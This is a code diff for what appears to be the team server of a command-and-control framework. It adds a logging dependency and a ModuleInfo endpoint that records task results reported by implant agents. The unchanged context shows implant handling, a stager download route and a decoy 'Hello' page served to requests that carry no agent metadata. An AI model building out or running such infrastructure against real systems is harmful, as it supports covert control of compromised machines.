@@ -1,10 +1,12 @@
 ﻿using ApiModels.Response;
 using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using TeamServer.Models.File;
@@ -20,7 +22,7 @@ namespace TeamServer.Models
         private IListenerService _listenerService;
         private IBinMakerService _binMakerService;
 
-        public HttpListenerController(IAgentService agentService, IFileService fileService, IListenerService listenerService, IBinMakerService binMakerService)
+        public HttpListenerController(IAgentService agentService, IFileService fileService, IListenerService listenerService, IBinMakerService binMakerService, ILoggerFactory loggerFactory)
         {
             this._agentService=agentService;
             this._fileService = fileService;
@@ -30,6 +32,7 @@ namespace TeamServer.Models
 
         public async Task<IActionResult> HandleImplant()
         {
+            
             var metadata = ExtractMetadata(HttpContext.Request.Headers);
             if (metadata == null)
                 return Content("<html>Hello</html>"); ;
@@ -61,6 +64,8 @@ namespace TeamServer.Models
 
             return Ok(tasks);
         }
+
+
 
         private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
         {
@@ -141,6 +146,26 @@ namespace TeamServer.Models
             return Ok();
         }
         #endregion
+
+        public IActionResult ModuleInfo([FromBody] AgentTaskResult res)
+        {
+            //System.IO.File.AppendAllText("log.log", $"ModuleInfo called.{Environment.NewLine}");
+            foreach (var agent in this._agentService.GetAgents())
+            {
+                var existing = agent.GetTaskResult(res.Id);
+                if (existing != null)
+                {
+                    //System.IO.File.AppendAllText("log.log", $"Found at {existing.Id}{Environment.NewLine}");
+                    existing.Status = res.Status;
+                    existing.Info = res.Info;
+                    existing.Result = res.Result;
+                    break;
+                }
+            }
+
+            return Ok();
+        }
+
 
         public IActionResult DownloadStager()
         {
